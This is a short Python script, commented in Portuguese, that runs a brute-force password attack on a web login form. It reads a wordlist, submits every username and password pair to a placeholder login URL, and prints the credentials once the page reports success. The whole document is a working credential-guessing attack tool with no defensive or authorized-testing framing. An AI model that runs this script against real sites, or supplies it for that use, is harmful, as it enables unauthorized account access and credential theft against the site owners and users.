import urllib.parse
import urllib.request

wordlist = "insira o nome da lsita aqui"+".txt"

url = 'http://www.exemplo.com/login.php' # URL da página de login
usernames = [''] # Lista de usuários
with open(wordlist, 'r') as f:
    passwords = [line.strip() for line in f.readlines()] # Lista de senhas

for username in usernames:
    for password in passwords:
        values = {'username': username, 'password': password} # Dados de login
        data = urllib.parse.urlencode(values).encode('utf-8') # Codifica os dados em formato de bytes

        # Faz a requisição de login
        req = urllib.request.Request(url, data)
        response = urllib.request.urlopen(req)
        html = response.read().decode('utf-8')

        # Verifica se o login foi bem sucedido
        if 'Login bem sucedido' in html:
            print(f'Login bem sucedido com usuário "{username}" e senha "{password}"')
            break # Sai do loop interno se o login foi bem sucedido
        else:
            print(f'Login falhou com usuário "{username}" e senha "{password}"')
